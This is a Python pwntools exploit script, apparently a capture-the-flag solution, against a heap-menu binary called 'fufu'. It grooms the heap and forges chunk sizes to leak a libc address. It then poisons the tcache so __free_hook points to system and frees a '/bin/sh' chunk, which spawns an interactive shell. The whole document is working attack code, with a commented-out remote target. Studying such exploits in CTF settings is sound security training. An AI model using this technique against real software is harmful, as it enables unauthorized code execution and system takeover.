from pwn import *

p = process('./fufu')
#p = remote('143.198.184.186', 5005)
#raw_input()
#pid = gdb.attach(p, gdbscript="""
#        b * display
        
        
        
 #       """)

def create(index,size,content):
    global p
    p.sendlineafter(b'do?\n',b'1')
    p.sendlineafter(b'on?\n',str(index))
    p.sendlineafter(b'want?\n',str(size))
    p.sendlineafter(b'content.\n',content)


def display(index):
    global p
    p.sendlineafter(b'do?\n',b'2')
    p.sendlineafter(b'dispaly?\n',str(index))


def reset(index):
    global p
    p.sendlineafter(b'do?\n',b'3')
    p.sendlineafter(b'reset?\n',str(index))



create(0,0x10,b'aAA')
create(0,0x40, b'VVV')

create(0,0x90,"FFFFFF")


create(0,0x60,0x20*b'A')
create(0,0x200,0x20*b'B')

create(0,0x70,0x70*b'C')
reset(0)
create(0,0x70,0x70*b'C')
reset(0)
create(0,0x70,0x70*b'G')
reset(0)
payload= b'R'*16
payload += p64(0x420)
payload += p64(0x61)
payload += p64(0)
payload += p64(0)
create(0,0x70,payload)

reset(0)
payload = b'B' * 0x7e
payload += b"\x00" * 10
payload += p64(0x421)
create(0,0x200,payload)
create(0,0x60,0x8*b'F')
create(0,0xe0,b'WWWWWWWW')
payload = 0x80 * 'B'



create(0,0x200,payload)
display(0)
p.recvline()
p.recvline()
leak = u64(p.recvline()[-7:-1].ljust(8,b'\0'))
print('libc_leak: ',hex(leak))

libc_base = leak - 0x1bebe0
system = libc_base + 0x000000000048e50

__free_hook = libc_base + 0x1c1e70

print('system: ',hex(system))
print('__free_hook: ',hex(__free_hook))



create(0,0x10,b'aAA')
create(0,0x40, b'VVV')
payload = 0x80 * b'B'
payload += p64(0)
payload += p64(0x21)
#payload += p64(0x21)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0x21)

create(0,0x90,payload)
create(0,0x40,b'DDDDDDD')
payload += p64(__free_hook)
create(0,0x90, payload)

create(0,0x10,b'RRRR')
reset(0)
create(0,0x10,p64(system))
#ceate chnk z 0x90 pa /bin/sh\0 v hex

create(0,0x90,b"/bin/sh")
#create(0,0xe,"heheshel")

p.sendline('1')
p.sendline('0')

p.interactive()

#	create(0,0x70,0x70*b'C')
#	create(0,0x70,0x70*b'C')
